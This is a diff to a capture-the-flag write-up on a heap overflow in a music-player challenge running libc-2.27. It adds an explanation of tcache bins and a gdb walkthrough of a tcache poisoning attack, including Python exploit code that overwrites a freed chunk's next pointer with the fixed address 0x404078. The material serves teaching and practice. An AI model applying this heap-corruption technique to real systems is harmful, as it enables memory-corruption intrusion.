@@ -184,6 +184,8 @@ Great, we have a heap overflow! The size of the top chunk has been overwritten w
 
 ### What even is a tcache? 
 
+_(If you're already familiar with tcache attacks, or don't really care, you can skip this and the next section)_
+
 Given that this is libc-2.27.so, that means that the heap will have tcache bins. Tcache is a set of 64 singly linked lists, one for increasing chunk sizes up to 1032 (at least for libc-27). When a chunk within this size range gets free, it will end up in its corresponding tcache bin if there's room (each bin holds up to 7 chunks). Conversly, when a chunk in this size range is requested by the program, the heap manager checks it's corresponding tcache bin _first_ to see if there's a freed chunk it can use. Tcache was added to improve performance, and as such they removed many of the security checks, which will be useful to us in this challenge. 
 
 [This](https://syedfarazabrar.com/2019-10-12-pico
@@ -305,10 +307,83 @@ tcache bin 0x20 ->  0x404078
 ```
 Now when we play anotherr song of size 0, the heap manager will give us 0x404078!
 
+### What does this look like when we use like every gdb tool 
+
+What does this look like within the actual program, using gdb + rr + gef + pwndbg? First we need a way to import and play songs of 0 bytes, which at first doesn't seem possible because all available files have at least 700 bytes. However, by importing just a directory name, we can create songs of 0 bytes. 
+
+```python
+
+for i in range(1,20): # songs 1 - 19 = 0x20 bytes
+    import_song("Warrior/")
+    
+for i in range(20, 30): # songs 20 - 29 = 0x310 bytes
+    import_song("Rainbow/godzilla.txt")
+    
+for i in range(30, 36): # songs 30 - 35 = 0x3c0 bytes
+    import_song("Animal/animal.txt")
+
+for i in range(36, 44): # songs 36 - 43 = 0x20 bytes
+    import_song("Rainbow/")
+
+album = "Cannibal"
+import_song(album + "/" * (24-len(album))) 
+
+play_song("11") # song 44 chunk = "chunk A"
+play_song("12") # 0x20 chunk = "chunk B"
+play_song("21") # 0x310 chunk  
+play_song("13") # 0x20 chunk = "chunk X"
+
+remove_song("13") # free "chunk X"
+remove_song("12") # free "chunk B"
+remove_song("11") # free "chunk A"
+
+play_song("44")
+p.sendline("-1")
+chunkA = p64(0x00) * 2 
+chunkB = p64(0x00) + p64(0x21) + p64(0x404078) 
+
+p.send(chunkA + chunkB)
+
+play_song("14")
+play_song("15")
+
+```
+This is what the heap looks like after we've free'd our chunks but before we play song #44.
+
+![before_overwrite](../../images/before_overwrite.png)
+
+These addresses will change on future runs, because the address of the heap is subject to ASLR, but for now:
+
+```
+chunk A = 0x1ad1290
+chunk B = 0x1ad12b0
+chunk X = 0x1ad15e0
+```
+It's important to note that because the `.bss` section is part of the binary and there is no PIE, those addresses remain the same.So the address of `songs[0].fd` will always be `0x404078`.
+
+After we play song #44 and send our data, this is what the heap looks like:
+
+![after_overwrite](../../images/after_overwrite.png)
+
+As you can see the pointer to the next tcache chunk in B now reads `0x404078`! This is what this looks like on the heap.
+
+![after_memory](../../images/after_memory.png)
+
+You also may notice that gef doesn't like what we've done and can't print out the heap. Luckily, calling heapinfo with [pwngdb](https://github.com/scwuaptx/Pwngdb) which I have on top of gef still works:
+
+![pwngdb](../../images/pwngdb.png)
+
+Because the heap thinks that `songs[0].fd = 3` is a chunk in the tcache, it thinks that 3 is the next tcache pointer from it. That won't matter to us unless we mess up and try to allocate another chunk of 0x20 without putting more chunks into the 0x20 tcache bin. 
+
+You can also call `vmmap` in gef to get the base address of the heap and `tele` that address to find the actual place in memory where the heap stores the tcache bins (which are at the start of the heap). This is what it looked like **before** we freed everything. 
+
+![vmmap](../../images/vmmap.png)
+
+![tcache](../../images/tcache.png)
+
 ### Now let's clobber some Ke$ha songs (structs)
 
-What does this look like within the actual program? 
-If you're interested in knowing more about heap attacks Azeria's [post](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/) on the glibc heap is a good place to start, as well as Shellphish's [how2heap](https://github.com/shellphish/how2heap) repository which also links to further resources. 
+Ok so now that we've gone over the basics of how this tcache will work, I'm going to keep it more high level. If you're interested in knowing more about heap attacks Azeria's [post](https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/) on the glibc heap is a good place to start, as well as Shellphish's [how2heap](https://github.com/shellphish/how2heap) repository which also links to further resources. 
 
 
 
